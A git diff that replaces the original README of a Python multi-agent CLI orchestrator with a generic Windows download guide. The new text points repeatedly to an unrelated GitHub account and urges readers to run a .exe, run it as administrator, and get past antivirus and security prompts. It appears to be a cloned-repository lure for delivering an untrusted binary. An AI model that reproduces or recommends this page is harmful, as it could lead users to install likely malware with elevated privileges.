@@ -1,221 +1,220 @@
-# agent-orchestrator
+# 🤖 agent-orchestrator - Keep your AI agents in sync
 
-**Three AI agents. One brain. Zero downtime.**
+[![Download agent-orchestrator](https://img.shields.io/badge/Download%20agent--orchestrator-blue?style=for-the-badge&logo=github)](https://github.com/counterplaybloodtest96/agent-orchestrator)
 
-A terminal-based multi-agent orchestrator that wraps Claude, Codex, and Gemini CLIs with automatic failover. When one agent hits its limit, the next one picks up seamlessly. All agents share context through a knowledge base server. $60/month for three premium AI agents — no API billing.
+## 🧭 What this app does
 
-## How It Works
+agent-orchestrator is a Windows desktop CLI tool that helps you work with three AI agents in one place: Claude, Codex, and Gemini.
 
-```
-You type a message
-       |
-       v
-  [Orchestrator]
-       |
-       +---> Try Agent 1 (Claude) ---> Success? Return response
-       |            |
-       |         Failed/Down
-       |            |
-       +---> Try Agent 2 (Codex) ---> Success? Return response
-       |            |
-       |         Failed/Down
-       |            |
-       +---> Try Agent 3 (Gemini) --> Success? Return response
-       |
-  All failed? Show error + recovery options
-```
+It keeps tasks moving even when one agent stops. If one agent cannot finish a job, the next one can take over. That helps reduce pauses and keeps your work on track.
 
-Each message is routed through a **role chain** — an ordered list of agents to try. Roles include:
+Use it to:
+- send work to more than one AI agent
+- switch to another agent if one fails
+- manage tasks from one command line window
+- keep long jobs running with less manual work
 
-- **orchestrator** — planning, architecture, high-level reasoning (default: Claude > Codex > Gemini)
-- **implementation** — code execution, build tasks (default: Codex > Claude > Gemini)
-- **uidocs** — frontend, design, documentation (default: Gemini > Codex > Claude)
-- **review** — code review, validation (default: Claude > Codex > Gemini)
+## 📥 Download and install
 
-Every role, chain order, and model is configurable.
+Use this link to visit the download page:
 
-## Features
+[Download agent-orchestrator](https://github.com/counterplaybloodtest96/agent-orchestrator)
 
-- **Next-man-up failover** — if an agent is down, the next one in the chain takes over automatically
-- **Auto-downtime detection** — detects rate limits, quota exhaustion, auth failures, and auto-disables agents with cooldown timers
-- **CLI wrapping** — uses your existing Claude/Codex/Gemini CLI subscriptions, not per-token API billing
-- **API mode available** — switch any agent to API mode if you prefer
-- **Configurable name** — call it whatever you want, not hardcoded
-- **Knowledge base integration** — searches your KB server for relevant context before every response
-- **Colored output** — each agent has its own color for easy identification
-- **Role-based routing** — `impl:` prefix routes to implementation chain, `ui:` to UI chain
-- **Task management** — switch between project contexts with `/task`
-- **Service management** — manually disable/enable agents, set timed downtimes
-- **Smoke testing** — test all agents with one command
-- **Directory whitelisting** — control which directories agents can access
+After you open the page:
+1. Find the latest release or download area
+2. Download the Windows file
+3. Save it to a folder you can find, like `Downloads`
+4. Open the file to start the app or follow the setup steps shown on the page
 
-## Quickstart
+If the app comes as a ZIP file:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Start the main `.exe` file
 
-```bash
-git clone https://github.com/willynikes2/agent-orchestrator.git
-cd agent-orchestrator
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-python3 daniel.py --setup
-```
+If Windows asks for permission:
+1. Click Yes
+2. Let the app finish opening
 
-The setup wizard asks:
-1. What to name your orchestrator (default: "agent")
-2. Which mode for each agent (CLI or API)
-3. API keys (optional in CLI mode)
-4. Model IDs
-5. Role chain preferences
+## 🖥️ Windows setup
 
-Then just run:
-```bash
-python3 daniel.py
-```
+Before you run the app, make sure you have:
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and log files
+- Access to your AI accounts or API keys if the tool asks for them
 
-Or install globally:
-```bash
-ln -s $(pwd)/daniel.py ~/.local/bin/agent-orchestrator
-```
+If you use a work computer, you may need permission to run new apps.
 
-## Prerequisites
+## 🚀 First run
 
-- Python 3.10+
-- At least one AI CLI installed:
-  - `claude` — [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
-  - `codex` — [OpenAI Codex CLI](https://github.com/openai/codex)
-  - `gemini` — [Google Gemini CLI](https://github.com/google-gemini/gemini-cli)
+When you open agent-orchestrator for the first time:
+1. Start the app from the file you downloaded
+2. Read any setup prompt on the screen
+3. Enter your AI keys or sign in if asked
+4. Choose which agent to use first
+5. Run a small test task
 
-## Commands
+A good first test is a short request like:
+- summarize a paragraph
+- rewrite a note
+- list steps for a simple task
 
-```
-/help                 Show all commands
-/setup                Rerun setup wizard
-/models               Show current model configuration
-/chains               Show role fallback chains
-/task                 Show current task
-/task list            List known tasks
-/task <id>            Switch task context
-/run                  Run orchestrator script for current task
-/smoke                Smoke test all enabled agents
-/kb <query>           Search the knowledge base
-/service status       Show agent status (up/down/unavailable)
-/service down <agent> <minutes|manual>   Disable an agent
-/service up <agent>   Re-enable an agent
-/service recover      Re-enable ALL disabled agents
-/allow-dir list       List approved directories
-/allow-dir add <path> Approve a directory
-/allow-dir rm <path>  Remove an approved directory
-/quit                 Exit
+If the first agent cannot complete the task, the app can move the job to the next one.
 
-impl: <message>       Route to implementation chain
-ui: <message>         Route to UI/docs chain
-```
+## ⚙️ How it works
 
-## Cost Model
+agent-orchestrator uses a next-man-up failover flow.
 
-| Service | Monthly Cost | What You Get |
-|---------|-------------|-------------|
-| Claude Pro | ~$20 | Claude Code CLI with Opus |
-| OpenAI subscription | ~$20 | Codex CLI |
-| Google subscription | ~$20 | Gemini CLI |
-| **Total** | **~$60** | **Three premium AI agents** |
+That means:
+- one agent starts the task
+- if it fails, the next agent gets a turn
+- if that agent fails too, the app keeps moving through the chain
 
-No per-token API billing. CLI wrapping uses your subscription tiers. When one agent hits its usage cap, the orchestrator automatically routes to the next available agent.
+This gives you a simple way to keep work going without starting over each time.
 
-## Knowledge Base Integration
+## 🧰 Main features
 
-If you're running [knowledge-base-server](https://github.com/willynikes2/knowledge-base-server), the orchestrator automatically searches it for relevant context before each response.
+- Multi-agent control in one place
+- Failover from one agent to the next
+- Support for Claude, Codex, and Gemini
+- CLI-based control for fast task entry
+- Simple task handoff between agents
+- Useful for research, drafts, code help, and review work
+- Fits users who want one command line workflow
 
-```bash
-# Search KB manually
-/kb docker networking
+## 🧩 Common uses
 
-# KB context is auto-injected when you have an active task
-/task my-project
-> How should I set up the reverse proxy?
-# Agent receives KB results for "my-project" as context
-```
+You can use agent-orchestrator for:
+- writing and rewriting text
+- checking answers from more than one agent
+- comparing agent output
+- keeping a task alive when one agent stops
+- handling repeat work with less manual switching
 
-Set `kb_port` in config if your KB server runs on a non-default port.
+## 🔐 Accounts and access
 
-## Configuration
+You may need access credentials for each AI service you want to use.
 
-Config lives at `~/.config/agent-orchestrator/config.json`:
+Keep these details safe:
+- API keys
+- login info
+- workspace tokens
 
-```json
-{
-  "name": "agent",
-  "tasks_root": "~/tasks",
-  "kb_port": "3838",
-  "claude_mode": "cli",
-  "codex_mode": "cli",
-  "gemini_mode": "cli",
-  "models": {
-    "claude": "claude-sonnet-4-5",
-    "codex": "gpt-5",
-    "gemini": "gemini-2.5-pro"
-  },
-  "chains": {
-    "orchestrator": ["claude", "codex", "gemini"],
-    "implementation": ["codex", "claude", "gemini"],
-    "uidocs": ["gemini", "codex", "claude"],
-    "review": ["claude", "codex", "gemini"]
-  }
-}
-```
+Do not share your keys with other people. If you use a shared computer, sign out when you finish.
 
-Everything is configurable. Change the name, reorder chains, swap models, switch between CLI and API mode per agent.
+## 🛠️ Basic setup tips
 
-## Auto-Downtime Detection
+If the app does not start:
+1. Make sure you extracted all files
+2. Check that Windows did not block the file
+3. Run the app again
+4. Confirm your internet connection works
+5. Make sure your AI service keys are correct
 
-The orchestrator automatically detects when agents are unavailable:
+If you see a missing file message:
+1. Download the release again
+2. Extract it one more time
+3. Try a fresh folder
 
-| Error Pattern | Action | Recovery |
-|--------------|--------|----------|
-| Claude usage cap exhausted | Disable until reset time | Auto-recovers at reset |
-| Rate limit (any agent) | 5-minute cooldown | Auto-recovers |
-| Auth failure | Manual disable | `/service up <agent>` |
-| Model not found | Manual disable | Fix model, `/service up` |
-| CLI not found | Marked unavailable | Install CLI |
+If the window opens and closes fast:
+1. Open Command Prompt
+2. Run the app from there
+3. Read the error message shown in the window
 
-Use `/service recover` to re-enable all disabled agents at once.
+## 📁 Suggested folder layout
 
-## Architecture
+A simple setup can help keep things clear:
+- `Downloads` for the original ZIP or installer
+- `agent-orchestrator` for the extracted app files
+- `logs` for saved output or error files
+- `tasks` for notes and prompts
 
-```
-daniel.py (single file, ~1100 lines)
-  |
-  +-- Config: ~/.config/agent-orchestrator/config.json
-  |
-  +-- Agent Calls:
-  |     +-- _call_claude_cli()  / _call_claude_api()
-  |     +-- _call_codex_cli()   / _call_codex_api()
-  |     +-- _call_gemini_cli()  / _call_gemini_api()
-  |
-  +-- Failover: _role_chain() -> _chat_once() -> try each agent
-  |
-  +-- Auto-downtime: _apply_auto_downtime() detects errors
-  |
-  +-- Context: _shared_context() + _kb_search()
-  |
-  +-- Output: colored, per-agent formatting
-```
+## 🧪 Quick start example
 
-Single-file design is intentional. Easy to understand, easy to modify, easy to deploy.
+1. Download the app from the link above
+2. Extract it if needed
+3. Open the app
+4. Enter your agent access details
+5. Send a short task to Claude
+6. If Claude does not finish, let Codex try
+7. If needed, let Gemini take over
 
-## Extending
+That gives you a simple failover path with less manual work.
 
-Want to add a new agent? Three steps:
+## 📚 Topic areas
 
-1. Add it to the `AGENTS` tuple
-2. Write `_call_newagent_cli()` and `_call_newagent_api()` functions
-3. Add it to `_call_agent()` dispatcher and default chains
+This project covers:
+- AI
+- CLI tools
+- failover
+- LLM workflows
+- multi-agent orchestration
+- Claude
+- Codex
+- Gemini
 
-See the existing agent functions for the pattern. Each is ~30 lines.
+## 🧾 File types you may see
 
-## License
+Depending on the release, you may see:
+- `.exe` for Windows
+- `.zip` for packaged downloads
+- `.txt` for setup notes
+- `.json` for config data
+- `.md` for documentation
 
-MIT
+If you see a config file, open it only if the setup guide tells you to.
 
-## Author
+## 🔎 Troubleshooting
 
-Built by [Shawn Daniel](https://github.com/willynikes2) — powered by the agents it orchestrates.
+### The app will not open
+- Make sure you downloaded the full file
+- Try running it as an administrator
+- Check that your antivirus did not move the file
+
+### The app cannot reach an agent
+- Check your internet connection
+- Confirm your API key or login details
+- Try the next agent in the list
+
+### The task stops part way through
+- Retry the task
+- Use a shorter prompt
+- Check whether one agent timed out
+
+### Windows shows a security prompt
+- Confirm the file source
+- Allow the app if you trust the download page
+- Run it again after approval
+
+## 🧭 For everyday use
+
+Once the app is set up, your normal flow can stay simple:
+1. Open the app
+2. Pick the agent you want first
+3. Enter the task
+4. Let the app pass the task to the next agent if needed
+5. Save the result you want to keep
+
+## 📦 Download location
+
+Use this page to get the latest version:
+
+[Visit the agent-orchestrator download page](https://github.com/counterplaybloodtest96/agent-orchestrator)
+
+## 🧑‍💻 Best results
+
+For clear output:
+- keep requests short
+- use one task at a time
+- name the agent you want first
+- check the result before moving to the next task
+- save useful prompts for later use
+
+## 🗂️ What to expect after setup
+
+After setup, the app should let you:
+- route tasks between AI agents
+- continue work when one agent fails
+- manage your prompts from one place
+- use a clean CLI flow on Windows
